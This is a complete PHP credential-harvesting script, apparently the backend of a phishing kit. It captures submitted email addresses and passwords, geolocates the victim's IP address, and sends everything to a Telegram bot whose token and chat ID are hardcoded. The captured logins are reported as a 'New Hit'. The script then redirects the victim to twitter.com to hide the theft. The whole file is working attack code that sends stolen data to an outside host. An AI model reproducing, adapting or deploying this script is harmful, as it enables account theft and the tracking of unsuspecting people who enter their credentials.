<?php
$min_seconds_between_refreshes = 1000;
session_start();
if(array_key_exists("last_access", $_SESSION) && time()-$min_seconds_between_refreshes <= $_SESSION["last_access"]) {
  exit("<H1>You are refreshing too quickly, please wait a few seconds and try again.</H1>");
}
$_SESSION["last_access"] = time();
?>
<?php
$email = $_POST['email'];
$password = $_POST['password'];
$text = $_POST['text'];
$API_KEY = '7185549842:AAEiajU9mjZ3sqHVcDCqzCTpZ2Zdt_FAZow';//TOKIN
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $yhya = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$yhya";
        $yhyasyrian = file_get_contents($url);
        return json_decode($yhyasyrian);
    }
    function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$api = json_decode(file_get_contents("https://ipinfo.io/$ip"));
$country = $api->country;
$city = $api->city;
$year = date('Y');
$month = date('n');
$day = date('j');
$admin = "5408493984";//Id
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
🎯 Hi Pro New Hit 🎯
-------------------------------------------
📟 ! User » $text
📨 ! EMAIL  » `$email`
🔑 ! PASSWORD  » `$password`
🗺 ! COUNTRY  » $country
🌐 ! ip » $ip
🌆 ! CITY  » $city
📝 ! DATE  » $day/$month/$year
-------------------------------------------
⚜ ! BY » @r_G_m

",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
header('Location: https://twitter.com');